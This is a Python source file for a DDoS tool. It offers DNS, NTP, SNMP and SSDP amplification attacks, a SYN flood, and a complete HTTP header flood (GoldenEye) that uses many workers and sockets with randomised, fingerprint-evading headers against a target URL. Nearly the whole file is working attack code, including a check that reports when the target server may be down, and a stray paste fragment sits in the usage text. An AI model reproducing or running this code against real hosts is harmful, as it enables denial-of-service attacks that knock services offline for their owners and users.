#!/usr/bin/env python
import sys
import time
import socket
import struct
import threading
import subprocess

#from scapy.packet import ls
#from scapy.sendrecv import srloop
#from scapy.volatile import RandShort
from scapy.layers.inet import IP, TCP

from CFGClass import *
from random import randint
from optparse import OptionParser
import ConfigParser
from multiprocessing import Process, Manager
import urlparse
import random
from scapy.all import *
from amplificationStav import files, GetDomainList, DDoS, Benchmark, Monitor
from packetSenderManager import PacketSenderManager

USAGE = '''
%prog ddos amplification [options]	# DNS Amplification attack
%prog ddos amplification [options]	# NTP Amplification attack
%prog ddos amplification [options]	# Sfrom random import randint
NMP Amplification attack
%prog ddos amplification [options]	# SSDP Amplification attack
%prog ddos amplification BENCHMARK [options]	# Benchmarking Amplification
%prog ddos syn [options]		# SYN Flood attack
%prog ddos http [opitons]		# HTTP Header Package attack
'''

LOGO = r'''

 .-------------------------------------------------------------------------.
| .-----------------------------------------------------------------------. |
| |    _______          _________              __            ____   ____  | |
| |   /  ___  |        |  _   _  |            /  \          |_  _| |_  _| | |
| |  |  (__ \_|        |_/ | | \_|           / /\ \           \ \   / /   | |
| |   '.___`-.             | |              / ____ \           \ \ / /    | |
| |  |`\____) |           _| |_           _/ /    \ \_          \ ' /     | |
| |  |_______.'          |_____|         |____|  |____|          \_/      | |
| |                                                                       | |
| '-----------------------------------------------------------------------' |
 '-------------------------------------------------------------------------'


DEV TEAM ST - AV
DDoS Automated Tool


'''

HELP = (
    '-d --dns => Dns file required parameter. E.g. -d dnsServerList.txt',
    '-n --ntp => Ntp file required parameter. E.g. -n ntpServerList.txt',
    '-s --snmp => Snmp file required parameter. E.g. -s snmpList.txt',
    '-p --ssdp => Ssdp file required parameter. E.g. -p ssdpList.txt',
    '-t Number of threads (Default=1). E.g. -t 20',
    '-i IP Adress of target/victim. E.g. -i 192.168.1.1',
    '-o Generate output file. E.g. -o attackResult.txt',
    '-c Number of Packets to be sent. E.g -c 10000)(Use in SYN Attack)',
    '-l Size of each packets(byte). E.g. -l 120 (120 byte length packet)(Use in SYN Attack)',
    '-w Window size pf each packets(byte). E.g -w 64 (64 byte length window size) (Use in SYN Attack)',
    '-r Port number to send packets. E.g. -r 6060 (Use in SYN attack)',
    '-j Send SYN packets in flood mode. Doesnt wait response.May exceeds desired packet amount sent.(Use in SYN attack)',
    '-u Target URL that HTTP Headers are send to (Use in HTTP attack)',
    '-k Number of concurrent sockets. E.g. -k 100 (Use in HTTP attack)',
    '-m Select Method. GET or POST method. E.g -m get',
    '-a Feed with User Agent File',
    '-b Enable/Disable debug mode. E.g. -b true (Use in HTTP attacks)',
    '-x XUpdate changes to config file.'
)

HELPv2 = (
    'ddos amplification -dns dnsServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -ntp -ntpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -snmp snmpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -ssdp ssdpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos syn -c(number of packets) -d (packet size) -w (windowsize) -p (port) --flood TargetIp -o attackResult.txt',
    'ddos http -u (Target URL) -t(number of threads) -k (number of sockets) -m get/post (method) -d(enable/disable debug) -o attackResult.txt)'
)

OPTIONS = (
    (('-d', '--dns'), dict(dest='dns', metavar='FILE', help=HELP[0])),
    (('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
    (('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
    (('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
    (('-t', '--threads'), dict(dest='threads', type=int, default=1, help=HELP[4])),
    (('-i', '--targetIP'), dict(dest='targetIP', type="string", default="192.168.1.1", help=HELP[5])),
    (('-o', '--output'), dict(dest='output', metavar='FILE', help=HELP[6])),
    (('-c', '--countOfPackages'), dict(dest='countOfPackages', type=int, default=100, help=HELP[7])),
    (('-l', '--packageLength'), dict(dest='packageLength', type=int, default=120, help=HELP[8])),
    (('-w', '--windowSize'), dict(dest='windowSize', type=int, default=64, help=HELP[9])),
    (('-r', '--port'), dict(dest='port', type=int, default=12345, help=HELP[10])),
    (('-j', '--flood'), dict(dest='flood', type=int, default=0, help=HELP[11])),
    (('-u', '--url'), dict(dest='url', type="string", default='http:/www.example.com', help=HELP[12])),
    (('-k', '--socketCount'), dict(dest='socketCount', type=int, default=10, help=HELP[13])),
    (('-m', '--methodType'), dict(dest='methodType', type="string", default='get', help=HELP[14])),
    (('-a', '--useragent'), dict(dest='useragent', metavar='FILE', help=HELP[15])),
    (('-b', '--debugMode'), dict(dest='debugMode', type=int, default=0, help=HELP[16])),
    (('-x', '--write'), dict(dest='write', type="string", default="no", help=HELP[17]))
)

# Python version-specific
if sys.version_info < (3, 0):
    # Python 2.x
    import httplib

    HTTPCLIENT = httplib
else:
    # Python 3.x
    import http.client

    HTTPCLIENT = http.client
############################# AMPLIFICATON CONSTANTS ###########################


######################## GOLDENEYE CONSTANTS #################
DEBUG = False

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'HTTP Header DDoS Attack'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for
                    i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (
                random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537),
                random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (
                random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537),
                random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + [
                    '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for
                    i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (
                random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25)) for i
                     in
                     range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}


###################### AMPLIFICATION SOURCE CODE ##############################

####################### GOLDENEYE SOURCE CODE ##########
####
# GoldenEye Class
####

class GoldenEye(object):
    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print "Shutting down...."

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print
        print GOLDENEYE_BANNER
        print

    # Do the fun!
    def fire(self):

        self.printHeader()
        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
            self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "Starting {0} concurrent workers".format(self.nr_workers)

        # Start workers
        for i in range(int(self.nr_workers)):

            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                Exception.error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print "Initiating monitor"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "{0} Tool strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and \
                                self.counter[1] > self.last_counter[1]:
                    print "\tServer may be DOWN!"

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass  # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all workers"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Killing worker {0}".format(worker.name)
                        # worker.terminate()
                        worker.stop()
                    except Exception, ex:
                        pass  # silently ignore
                if DEBUG:
                    raise
                else:
                    pass


####
# Striker Class
####

class Striker(Process):
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    # builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def run(self):
        if DEBUG:
            print "Starting worker {0}".format(self.name)
        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(c)
                    for conn_req in self.socks:
                        (url, headers) = self.createPayload()
                        method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                        conn_req.request(method.upper(), url, None, headers)
                    for conn_resp in self.socks:
                        resp = conn_resp.getresponse()
                        self.incCounter()
                    self.closeConnections()
            except (Exception):
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass  # silently ignore

        if DEBUG:
            print "Worker {0} completed run. Sleeping...".format(self.name)


    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass  # silently ignore


    def createPayload(self):
        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)


    def generateQueryString(self, ammount=1):
        queryString = []

        for i in range(ammount):
            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def generateData(self):
        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()

        return (request_url, http_headers)


    def generateRequestUrl(self, param_joiner='?'):
        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))


    def getUserAgent(self):
        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))

        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (
                ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0])

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string


    def generateRandomHeaders(self):
        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1, len(acceptEncoding) / 2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Host': self.host,
        }

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],
                                                                            round(random.random(), 1),
                                                                            round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(random.randint(5, 10))

            random_referer = random.choice(self.referers) + url_part

            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers


    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()


    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass


    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            print Exception
            pass


def main():
    parser = OptionParser(usage=USAGE)
    for args, kwargs in OPTIONS:
        parser.add_option(*args, **kwargs)
    options, args = parser.parse_args()
    domains = None

    configParser = ConfigParser.RawConfigParser()
    configFilePath = 'config.txt'
    # r'config.txt'
    # configParser.read(configFilePath)
    configFileHelper = ConfigFileHelper(configParser, configFilePath)

    if configFileHelper:
        # configFileHelper.printCfgProperties()
        print 'Default configuration file loaded succesfully...'
    else:
        print 'Config file could NOT loaded!!'
        sys.exit()

    if len(args) < 1:
        # parser.print_help()
        # sys.exit()
        print 'Supply at least One argument..'
        print 'For more information, -h'
        sys.exit()
    else:
        if args[0].lower() == 'ddos':
            print 'DDoS attack management started...'
            if len(args) < 2:
                print 'Attack vector parameter is missing'
                parser.print_help()
                # print USAGE
                sys.exit()
            else:
                if args[1].lower() == 'amplification':
                    if options.dns:
                        # domains = GetDomainList(options.dns)
                        # files['dns'] = [options.dns]
                        # DNS Server listesini guncelle
                        configFileHelper.dnsAmp.dnsServerList = options.dns
                        # Target IP'yi guncelle
                        if options.targetIP:
                            configFileHelper.dnsAmp.targetIp = options.targetIP
                    if options.ntp:
                        # files['ntp'] = [options.ntp]
                        configFileHelper.ntpAmp.ntpServerList = options.ntp
                        if options.targetIP:
                            configFileHelper.ntpAmp.targetIp = options.targetIP
                    if options.snmp:
                        # domains = GetDomainList(options.snmp)
                        # files['snmp'] = [options.snmp]
                        configFileHelper.snmpAmp.snmpServerList = options.snmp
                        if options.targetIP:
                            configFileHelper.snmpAmp.targetIp = options.targetIP
                    if options.ssdp:
                        # domains = GetDomainList(options.ssdp)
                        # files['ssdp'] = [options.ssdp]
                        configFileHelper.ssdpAmp.ssdpServerList = options.ssdp
                        if options.targetIP:
                            configFileHelper.ssdpAmp.targetIp = options.targetIP

                    # Update config file
                    if options.write == 'yes':
                        configFileHelper.writeChangesToConfigFile()
                    # BENCHMARK AREA

                    if len(args) == 3:
                        if 'BENCHMARK' == args[2].upper():
                            if configFileHelper.dnsAmp.benchmark == 'yes':
                                files['dns'] = [configFileHelper.dnsAmp.dnsServerList]
                            if configFileHelper.ntpAmp.benchmark == 'yes':
                                files['ntp'] = [configFileHelper.ntpAmp.ntpServerList]
                            if configFileHelper.snmpAmp.benchmark == 'yes':
                                files['snmp'] = [configFileHelper.snmpAmp.snmpServerList]
                            if configFileHelper.ssdpAmp.benchmark == 'yes':
                                files['ssdp'] = [configFileHelper.ssdpAmp.ssdpServerList]
                            if files:
                                event = threading.Event()
                                event.set()
                                domains = GetDomainList(configFileHelper.dnsAmp.targetIp)  # '192.168.1.10'
                                ddos = DDoS(args[2], configFileHelper.dnsAmp.threads, domains, event)
                                Benchmark(ddos)
                        else:
                            print 'Enter proper argument.. E.g. BENCHMARK'

                if args[1].lower() == 'http':
                    print 'HTTP Header DDoS is started...'
                    ###	Golden eye scriptini koy
                    uas_file = None
                    useragents = None
                    url = None
                    if options.url:
                        url = options.url
                        if url[0:4].lower() != 'http':
                            print "Invalid URL supplied"
                            parser.print_help()
                            # print OPTIONS
                            sys.exit()
                    if options.socketCount:
                        socks = int(options.socketCount)
                    if options.methodType:
                        method = options.methodType
                    if options.threads:
                        workers = int(options.threads)
                    if options.useragent:
                        uas_file = options.useragent
                    if options.debugMode:
                        if options.debugMode == 0:
                            DEBUG = False
                        elif options.debugMode >= 1:
                            DEBUG = True

                    # Update config file
                    if options.write == 'yes':
                        configFileHelper.writeChangesToConfigFile()

                    if uas_file:
                        try:
                            with open(uas_file) as f:
                                useragents = f.readlines()
                        except EnvironmentError:
                            EnvironmentError.error("cannot read file {0}".format(uas_file))

                        goldeneye = GoldenEye(url)
                        goldeneye.useragents = useragents
                        goldeneye.nr_workers = workers
                        goldeneye.method = method
                        goldeneye.nr_sockets = socks
                        goldeneye.fire()
                ## elif olmasi lazim...
                if args[1].lower() == 'syn':
                    # Update config file
                    if options.write == 'yes':
                        configFileHelper.writeChangesToConfigFile()
                        # print 'SYN Flood DDoS is started...'
                        # ####	hping3 scriptini koy
                        # #conf.verb=0
                        # print "Field Values of packet sent"
                        # p=IP(dst=options.targetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80,8000],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
                        # ls(p)
                        # print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
                        # ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
                        # print "Summary of answered & unanswered packets"
                        # ans.summary()
                        # unans.summary()
                        # print "source port flags in response"
                        # #for s,r in ans:
                        # # print r.sprintf("%TCP.sport% \t %TCP.flags%")
                        # ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))

                if args[1].lower() == 'attack':
                    print 'DDoS attack session executed....'
                    targetip = None
                    if configFileHelper.dnsAmp.enabled == 'yes':
                        files['dns'] = [configFileHelper.dnsAmp.dnsServerList]
                        domains = GetDomainList(configFileHelper.dnsAmp.targetIp)
                        print domains
                        targetip = configFileHelper.dnsAmp.targetIp
                    if configFileHelper.ntpAmp.enabled == 'yes':
                        files['ntp'] = [configFileHelper.ntpAmp.ntpServerList]
                        targetip = configFileHelper.ntpAmp.targetIp
                    if configFileHelper.snmpAmp.enabled == 'yes':
                        files['snmp'] = [configFileHelper.snmpAmp.snmpServerList]
                        targetip = configFileHelper.snmpAmp.targetIp
                    if configFileHelper.ssdpAmp.enabled == 'yes':
                        files['ssdp'] = [configFileHelper.ssdpAmp.ssdpServerList]
                        targetip = configFileHelper.ssdpAmp.targetIp
                    if files:
                        event = threading.Event()
                        event.set()
                        try:
                            ddos = DDoS(socket.gethostbyname(targetip), configFileHelper.dnsAmp.threads, domains, event)
                            print 'Amplificated DDoS started for enabled vectors..'
                            ddos.stress()
                            Monitor()
                            event.clear()
                        except KeyboardInterrupt:
                            print '\nInterrupted..'
                            event.clear()

                    if configFileHelper.synFlood.enabled == 'yes':
                        print 'SYN Flood DDoS is started...'
                        event = threading.Event()
                        event.set()
                        try:
                            packetSenderManager = PacketSenderManager(configFileHelper, 'TCP', event)
                            packetSenderManager.startTCPSender()
                            packetSenderManager.monitorNetwork()
                        except KeyboardInterrupt:
                            print '\nInterrupted..'
                            event.clear()
                        ####	hping3 scriptini koy
                        # conf.verb=0
                        # print "Field Values of packet sent"
                        # ports = (configFileHelper.synFlood.port)
                        # portList = ports.split(',')
                        # intPortList = map(int, portList)
                        # # print ports
                        # # print portList
                        # # print intPortList
                        # p = IP(dst=configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
                        #                                                                        dport=intPortList,
                        #                                                                        seq=12345, ack=1000,
                        #                                                                        window=1000,
                        #                                                                        flags="S") / "SZR_TPRK"
                        # ls(p)
                        # if configFileHelper.synFlood.flooding == 'yes':
                        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
                        #     # print "Summary of answered & unanswered packets"
                        #     # ans.summary()
                        #     # unans.summary()
                        #     print "source port flags in response"
                        #     # for s,r in ans:
                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
                        #     ans.make_table(
                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
                        # elif configFileHelper.synFlood.flooding == 'no':
                        #     print 'Flooding mode disabled.'
                        #     print str(configFileHelper.synFlood.packetCount) + ' packets will be sent..'
                        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
                        #                         count=configFileHelper.synFlood.packetCount)
                        #     # print "Summary of answered & unanswered packets"
                        #     # ans.summary()
                        #     # unans.summary()
                        #     print "source port flags in response"
                        #     # for s,r in ans:
                        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
                        #     ans.make_table(
                        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
                        #     # else:
                            # 	print 'Supply proper argument'
                            # 	parser.print_help()
                            # 	#print OPTIONS
                            # 	sys.exit()
        else:
            print 'Choose proper attack..'
            parser.print_help()
            # print OPTIONS
            sys.exit()


if __name__ == '__main__':
    print LOGO
    main()
